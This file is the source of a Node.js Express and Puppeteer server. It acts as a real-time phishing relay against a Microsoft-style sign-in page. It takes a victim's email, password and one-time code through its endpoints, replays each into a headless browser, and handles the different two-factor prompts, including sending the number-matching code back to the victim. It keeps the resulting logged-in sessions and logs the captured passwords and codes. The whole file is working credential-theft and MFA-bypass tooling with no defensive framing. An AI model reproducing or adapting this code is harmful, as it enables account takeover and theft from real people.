const express = require("express");
const cors = require("cors");
const fs = require("fs");
const puppeteer = require("puppeteer");
require("dotenv").config();
const path = require("path");
const { v4: uuidv4 } = require("uuid");

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());

app.use(express.static("public"));
app.use(express.json());

let sessions = {};

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "index.html"));
});

app.post("/email", async (req, res) => {
  let { sessionId, email } = req.body;
  if (!email) {
    return res.status(400).send("Email is required");
  }

  if (!sessionId) {
    sessionId = uuidv4();
  }

  if (sessions[sessionId]) {
    return res.status(400).send("Session already exists");
  }

  try {
    // const browser = await puppeteer.launch({ headless: false });
    const browser = await puppeteer.launch({
      args: [
        "--disable-setuid-sandbox",
        "--no-sandbox",
        "--single-process",
        "--no-zygote",
      ],
      executablePath:
        process.env.NODE_ENV === "production"
          ? process.env.PUPPETEER_EXECUTABLE_PATH
          : puppeteer.executablePath(),
    });
    const page = await browser.newPage();
    const userAgent =
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
    await page.setUserAgent(userAgent);
    await page.goto("https://login.affiniitiv.com/MNvZpKRD", {
      waitUntil: "networkidle2",
    });
    await page.waitForSelector("#i0116");
    await page.type("#i0116", email);
    await page.click("#idSIButton9");

    const selectors = ["#aadTile", "text/Enter password", "#password"];
    let result = "0";
    while (true) {
      try {
        const firstElement = await Promise.race([
          page
            .waitForSelector(selectors[0], { visible: true, timeout: 30000 })
            .then(() => selectors[0]),
          page
            .waitForSelector(selectors[1], { visible: true, timeout: 30000 })
            .then(() => selectors[1]),
          page
            .waitForSelector(selectors[2], { visible: true, timeout: 30000 })
            .then(() => selectors[2]),
        ]);
        if (firstElement === selectors[0]) {
          console.log("aadTile element found first!");
          result = "1";
        } else if (firstElement === selectors[1]) {
          console.log('"Enter password" text found first!');
          result = "2";
        } else if (firstElement === selectors[2]) {
          console.log("#password element found first!");
          result = "3";
        }
        break;
      } catch (error) {
        console.log("Neither element found, retrying...");
      }
    }

    if (result == "1") {
      await delay(1000);
      await page.click("#aadTile");
    }

    sessions[sessionId] = { browser, page };
    res.send(result);
    console.log(`Email: ${email} logged for session: ${sessionId}`);
  } catch (err) {
    console.error("Error in /email:", err);
    res.status(500).send(err);
  }
});

app.post("/pass", async (req, res) => {
  const { sessionId, password } = req.body;

  if (!sessionId || !password) {
    return res.status(400).send("Session ID and password are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;
    await page.waitForSelector("#i0118");
    await page.type("#i0118", password);
    await page.click("#idSIButton9");

    const selectors = [
      "text/Enter password",
      "text/Enter code",
      "text/Approve sign in request",
      "text/Stay signed in?",
    ];
    let result = "0";

    while (true) {
      try {
        const firstElement = await Promise.race([
          page
            .waitForSelector(selectors[0], { visible: true, timeout: 30000 })
            .then(() => selectors[0]),
          page
            .waitForSelector(selectors[1], { visible: true, timeout: 30000 })
            .then(() => selectors[1]),
          page
            .waitForSelector(selectors[2], { visible: true, timeout: 30000 })
            .then(() => selectors[2]),
          page
            .waitForSelector(selectors[3], { visible: true, timeout: 30000 })
            .then(() => selectors[3]),
        ]);
        if (firstElement === selectors[0]) {
          console.log(
            `Incorrect password: ${password} for session: ${sessionId}`
          );
          result = "0";
        } else if (firstElement === selectors[3]) {
          console.log("No 2FA");
          result = "1";
        } else if (firstElement === selectors[1]) {
          console.log("Enter Code");
          result = "2";
        } else if (firstElement === selectors[2]) {
          console.log("Approve Sign in request");
          await page.waitForSelector("#idRichContext_DisplaySign");
          const textContent = await page.$eval(
            "#idRichContext_DisplaySign",
            (el) => el.textContent
          );
          result = textContent;
        }
        break;
      } catch (error) {
        console.log("Neither element found, retrying...");
      }
    }

    if (result == "1") {
      await delay(1000);
      await page.waitForSelector("#idSIButton9");
      await page.click("#idSIButton9");

      console.log(`Password: ${password} logged for session: ${sessionId}`);
    } else if (result != "1" && result != "2") {
      await delay(60000);
      const content = await page.content();
      if (content.includes("Stay signed in?")) {
        await page.waitForSelector("#idSIButton9");
        await page.click("#idSIButton9");
      }
    }
    res.send(result);
  } catch (err) {
    console.error("Error in /pass:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.post("/code", async (req, res) => {
  const { sessionId, code } = req.body;

  if (!sessionId || !code) {
    return res.status(400).send("Session ID and code are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;
    await page.waitForSelector("#idTxtBx_SAOTCC_OTC");
    await page.type("#idTxtBx_SAOTCC_OTC", code);
    await page.click("#idSubmit_SAOTCC_Continue");

    const selectors = [
      "text/You didn't enter the expected verification code.",
      "text/Stay signed in?",
    ];
    let result = "0";

    while (true) {
      try {
        const firstElement = await Promise.race([
          page
            .waitForSelector(selectors[0], { visible: true, timeout: 30000 })
            .then(() => selectors[0]),
          page
            .waitForSelector(selectors[1], { visible: true, timeout: 30000 })
            .then(() => selectors[1]),
        ]);
        if (firstElement === selectors[0]) {
          result = "0";
          console.log(`Incorrect code: ${code} for session: ${sessionId}`);
        } else if (firstElement === selectors[1]) {
          result = "1";
        }
        break;
      } catch (error) {
        console.log("Neither element found, retrying...");
      }
    }

    if (result == "1") {
      await delay(5000);
      await page.click("#idSIButton9");
      console.log(`Code: ${code} logged for session: ${sessionId}`);
    }
    res.send(result);
  } catch (err) {
    console.error("Error in /code:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.post("/resend", async (req, res) => {
  const { sessionId, password, request } = req.body;

  if (!sessionId || !password) {
    return res.status(400).send("Session ID and password are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;
    const content = await page.content();
    if (content.includes("We didn't hear from you")) {
      await page.click("#idA_SAASTO_Resend");
      await delay(5000);
      await page.waitForSelector("#idRichContext_DisplaySign");
      const textContent = await page.$eval(
        "#idRichContext_DisplaySign",
        (el) => el.textContent
      );
      res.send(textContent);
    } else {
      res.send("0");
    }
  } catch (err) {
    console.error("Error in /resend:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
